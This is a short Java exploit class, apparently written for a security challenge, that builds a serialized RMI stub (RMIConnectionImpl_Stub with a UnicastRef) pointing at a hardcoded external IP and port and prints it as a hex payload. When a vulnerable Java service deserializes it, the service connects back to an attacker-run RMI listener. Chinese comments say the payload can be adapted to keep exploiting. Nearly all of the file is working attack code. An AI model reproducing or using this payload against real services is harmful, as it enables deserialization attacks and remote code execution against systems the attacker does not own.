package com.yxxx.javasec.deserialize;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.io.*;
import java.lang.reflect.Proxy;
import java.rmi.server.ObjID;


public class Exp7 {
    public static void main(String[] args) throws IOException {
        ObjID objID = new ObjID();
        TCPEndpoint tcpEndpoint = new TCPEndpoint("116.204.112.121",23333);
        UnicastRef unicastRef =new UnicastRef(new LiveRef(objID,tcpEndpoint,false));

        RMIConnectionImpl_Stub stud = new RMIConnectionImpl_Stub(unicastRef);
        //java.util.Map proxy = (Map) Proxy.newProxyInstance(Exp6.class.getClassLoader(),new Class[]{Map.class},);

    //    RMIConnectionImpl_Stub 继承至--> java.rmi.server.RemoteStub 继承至-->java.rmi.server.RemoteObject
      //  稍微改一下payload便能继续利用了：


        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeUTF("SJTU");
        oos.writeInt(1896);
        oos.writeObject(stud);
        oos.close();

        System.out.println(Utils.bytesTohexString(bos.toByteArray()));

    }
}